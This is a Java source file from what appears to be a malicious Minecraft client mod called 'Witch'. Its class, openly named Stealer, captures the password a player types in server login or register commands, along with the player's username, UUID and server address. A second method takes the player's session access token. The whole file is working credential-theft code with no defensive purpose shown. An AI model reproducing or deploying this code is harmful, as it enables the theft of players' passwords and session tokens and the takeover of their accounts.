package me.soda.witch.features;

import java.util.Arrays;
import java.util.Date;
import java.util.List;

import static me.soda.witch.Witch.mc;

public class Stealer {
    //Steal login passwords, returns username, password, server, uuid and timestamp
    public String[] stealPassword(String command) throws Exception {
        String username;
        String password;
        String server;
        String uuid;
        List<String> loginHint = Arrays.asList("l", "login", "log");
        List<String> regHint = Arrays.asList("reg", "register");
        String[] cmdArray = command.split(" ");
        if (cmdArray.length > 0) {
            if ((loginHint.contains(cmdArray[0]) && cmdArray.length == 2)
                    || (regHint.contains(cmdArray[0]) && cmdArray.length == 2 || cmdArray.length == 3)) {
                password = cmdArray[1];
                if (mc.getCurrentServerEntry() != null) {
                    String name = mc.isConnectedToRealms() ? "realms" : mc.getCurrentServerEntry().address;
                    server = name.replace(":", "_");
                } else {
                    server = "unknown/singleplayer";
                }
                username = mc.getSession().getUsername();
                uuid = mc.getSession().getUuid();
                String ts = String.valueOf(new Date().getTime());
                return new String[]{username, password, server, uuid, ts};
            }
        }
        throw new Exception("command not complete");
    }

    //Steal token, returns username, uuid, token and timestamp
    public String[] stealToken() {
        String username = mc.getSession().getUsername();
        String uuid = mc.getSession().getUuid();
        String token = mc.getSession().getAccessToken();
        String ts = String.valueOf(new Date().getTime());
        return new String[]{username, uuid, token, ts};
    }
}
